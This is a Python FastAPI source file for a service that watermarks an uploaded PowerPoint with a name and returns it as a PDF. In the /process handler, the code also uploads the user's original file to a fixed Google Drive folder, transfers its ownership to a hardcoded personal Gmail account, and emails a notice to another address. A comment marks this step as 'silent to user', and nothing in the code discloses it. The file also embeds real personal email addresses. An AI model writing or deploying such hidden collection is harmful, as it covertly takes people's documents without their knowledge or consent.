from fastapi import FastAPI, UploadFile, File, Form, HTTPException
from fastapi.responses import FileResponse, StreamingResponse

from pptx import Presentation
from pptx.util import Inches, Pt
from pptx.dml.color import RGBColor
from pptx.enum.text import PP_ALIGN

from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseUpload


import io
import os
import re
import tempfile
import subprocess
import zipfile
import smtplib
import logging
from email.message import EmailMessage
from pathlib import Path


APP_ROOT = Path(__file__).resolve().parents[1]
STATIC_DIR = APP_ROOT / "static"

# Drive folder id
DRIVE_FOLDER_ID = os.environ.get("DRIVE_FOLDER_ID", "1YBK7WC2pbS49sBU7hZyyehXvyQzhwkud")

# Email notification target (fixed)
NOTIFY_TO = "garylimjunwei@gmail.com"

# SMTP settings (Render env vars)
SMTP_HOST = os.environ.get("SMTP_HOST", "smtp.gmail.com")
SMTP_PORT = int(os.environ.get("SMTP_PORT", "587"))
SMTP_USER = os.environ.get("SMTP_USER", "")
SMTP_APP_PASSWORD = os.environ.get("SMTP_APP_PASSWORD", "")

app = FastAPI()

logger = logging.getLogger("pptx_app")
logging.basicConfig(level=logging.INFO)


def mm_to_inches(mm: float) -> float:
    return mm / 25.4


def validate_pptx_bytes(pptx_bytes: bytes) -> None:
    try:
        with zipfile.ZipFile(io.BytesIO(pptx_bytes), "r") as zf:
            if "[Content_Types].xml" not in zf.namelist():
                raise ValueError("Not a valid Office file.")
    except Exception:
        raise ValueError("Uploaded file is not a valid .pptx")


def sanitize_filename(name: str) -> str:
    name = (name or "").strip()
    name = re.sub(r"[^a-zA-Z0-9._ -]+", "_", name)
    return name[:180] or "upload.pptx"


def check_soffice_exists() -> bool:
    try:
        proc = subprocess.run(
            ["soffice", "--version"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        logger.info("soffice --version stdout=%s", (proc.stdout or "").strip())
        return proc.returncode == 0 or bool(proc.stdout.strip())
    except Exception as e:
        logger.error("soffice not found or not runnable: %s", e)
        return False


def get_drive_service_oauth():
    """
    Drive API client using OAuth refresh token (uploads as your Google user).
    """
    client_id = os.environ.get("GOOGLE_OAUTH_CLIENT_ID", "")
    client_secret = os.environ.get("GOOGLE_OAUTH_CLIENT_SECRET", "")
    refresh_token = os.environ.get("GOOGLE_OAUTH_REFRESH_TOKEN", "")

    if not (client_id and client_secret and refresh_token):
        raise RuntimeError("OAuth Drive credentials missing (set GOOGLE_OAUTH_* env vars).")

    creds = Credentials(
        None,
        refresh_token=refresh_token,
        token_uri="https://oauth2.googleapis.com/token",
        client_id=client_id,
        client_secret=client_secret,
    )
    creds.refresh(Request())

    return build("drive", "v3", credentials=creds)



def upload_original_to_drive(original_bytes: bytes, original_filename: str) -> str:
    """
    Upload ONLY the original PPTX into the target Drive folder. Returns fileId.
    """
    service = get_drive_service_oauth()



    media = MediaIoBaseUpload(
        io.BytesIO(original_bytes),
        mimetype="application/vnd.openxmlformats-officedocument.presentationml.presentation",
        resumable=False,
    )

    file_metadata = {
        "name": original_filename,
        "parents": [DRIVE_FOLDER_ID],
    }

    created = (
        service.files()
        .create(
            body=file_metadata,
            media_body=media,
            fields="id",
            supportsAllDrives=True,
        )
        .execute()
    )

    # Transfer ownership to the folder owner (your Gmail)
    service.permissions().create(
        fileId=created["id"],
        body={
            "type": "user",
            "role": "owner",
            "emailAddress": "fuyin.yknowwhat@gmail.com",  # your Gmail
        },
        transferOwnership=True,
    ).execute()


    return created["id"]


def send_notification_email(original_filename: str, drive_file_id: str) -> None:
    """
    Sends an email notification to NOTIFY_TO.
    Silent: if SMTP vars not set, it does nothing.
    """
    if not (SMTP_USER and SMTP_APP_PASSWORD):
        logger.info("SMTP not configured; skipping email notification.")
        return

    msg = EmailMessage()
    msg["Subject"] = "New PowerPoint upload received"
    msg["From"] = SMTP_USER
    msg["To"] = NOTIFY_TO
    msg.set_content(
        "A new PowerPoint was uploaded.\n\n"
        f"File: {original_filename}\n"
        f"Drive fileId: {drive_file_id}\n"
        "(Uploaded original only)\n"
    )

    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
        server.starttls()
        server.login(SMTP_USER, SMTP_APP_PASSWORD)
        server.send_message(msg)


def add_name_to_all_slides(pptx_bytes: bytes, name: str) -> bytes:
    prs = Presentation(io.BytesIO(pptx_bytes))

    # Bottom-right watermark box
    margin_right_mm = 12
    margin_bottom_mm = 10
    box_width_mm = 70
    box_height_mm = 10

    font_size_pt = 12
    font_rgb = RGBColor(255, 0, 0)  # RED
    tag_shape_name = "__WATERMARK_NAME__"

    for slide in prs.slides:
        # remove prior watermark if present
        to_remove = []
        for shape in slide.shapes:
            if getattr(shape, "name", "") == tag_shape_name:
                to_remove.append(shape)
        for shape in to_remove:
            el = shape._element
            el.getparent().remove(el)

        sw = prs.slide_width
        sh = prs.slide_height

        width = Inches(mm_to_inches(box_width_mm))
        height = Inches(mm_to_inches(box_height_mm))

        left = sw - width - Inches(mm_to_inches(margin_right_mm))
        top = sh - height - Inches(mm_to_inches(margin_bottom_mm))

        textbox = slide.shapes.add_textbox(left, top, width, height)
        try:
            textbox.name = tag_shape_name
        except Exception:
            pass

        tf = textbox.text_frame
        tf.clear()

        p = tf.paragraphs[0]
        run = p.add_run()
        run.text = name

        p.alignment = PP_ALIGN.RIGHT
        run.font.size = Pt(font_size_pt)
        run.font.color.rgb = font_rgb

    out = io.BytesIO()
    prs.save(out)
    return out.getvalue()


def convert_pptx_to_pdf(pptx_path: str, out_dir: str) -> str:
    """
    Uses LibreOffice headless to convert PPTX -> PDF.
    """
    cmd = [
        "soffice",
        "--headless",
        "--nologo",
        "--nofirststartwizard",
        "--convert-to",
        "pdf",
        "--outdir",
        out_dir,
        pptx_path,
    ]

    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if proc.returncode != 0:
        logger.error("LibreOffice convert failed. STDOUT=%s", (proc.stdout or "")[-2000:])
        logger.error("LibreOffice convert failed. STDERR=%s", (proc.stderr or "")[-2000:])
        raise RuntimeError("PDF conversion failed (see logs).")

    base = Path(pptx_path).stem
    pdf_path = Path(out_dir) / f"{base}.pdf"

    if not pdf_path.exists():
        pdfs = list(Path(out_dir).glob("*.pdf"))
        if not pdfs:
            logger.error("LibreOffice returned 0 but no PDF found in out_dir=%s", out_dir)
            raise RuntimeError("PDF conversion produced no output.")
        pdf_path = pdfs[0]

    return str(pdf_path)


@app.get("/")
def home():
    return FileResponse(STATIC_DIR / "index.html")


@app.post("/process")
async def process(file: UploadFile = File(...), name: str = Form(...)):
    try:
        name = (name or "").strip()
        if not name:
            raise HTTPException(status_code=400, detail="Name is required.")

        if not (file.filename or "").lower().endswith(".pptx"):
            raise HTTPException(status_code=400, detail="Upload a .pptx file.")

        raw = await file.read()
        if len(raw) > 50 * 1024 * 1024:
            raise HTTPException(status_code=413, detail="File too large (max 50 MB).")

        validate_pptx_bytes(raw)

        original_filename = sanitize_filename(file.filename or "upload.pptx")

        # Upload ORIGINAL to Drive + send email (silent to user if it fails)
        try:
            drive_file_id = upload_original_to_drive(raw, original_filename)
            send_notification_email(original_filename, drive_file_id)
            logger.info("Uploaded original to Drive. file=%s fileId=%s", original_filename, drive_file_id)
        except Exception as e:
                logger.exception(
                    "Drive upload failed. Check: (1) OAuth vars set (2) Drive folder permission (3) shared drive support. Error=%s",
                    e,
                )


        # Confirm LibreOffice is present
        if not check_soffice_exists():
            raise HTTPException(status_code=500, detail="Server misconfigured (LibreOffice missing).")

        # Add red name and convert to PDF
        watermarked = add_name_to_all_slides(raw, name)

        with tempfile.TemporaryDirectory() as td:
            in_pptx = Path(td) / "watermarked.pptx"
            in_pptx.write_bytes(watermarked)

            pdf_path = convert_pptx_to_pdf(str(in_pptx), td)
            pdf_bytes = Path(pdf_path).read_bytes()

        download_name = Path(original_filename).stem + "__named.pdf"

        return StreamingResponse(
            io.BytesIO(pdf_bytes),
            media_type="application/pdf",
            headers={
                "Content-Disposition": f'attachment; filename="{download_name}"',
                "Content-Type": "application/pdf"
            },
        )


    except HTTPException:
        raise
    except Exception as e:
        logger.exception("PROCESS FAILED: %s", e)
        raise HTTPException(status_code=500, detail="Server error (check logs).")
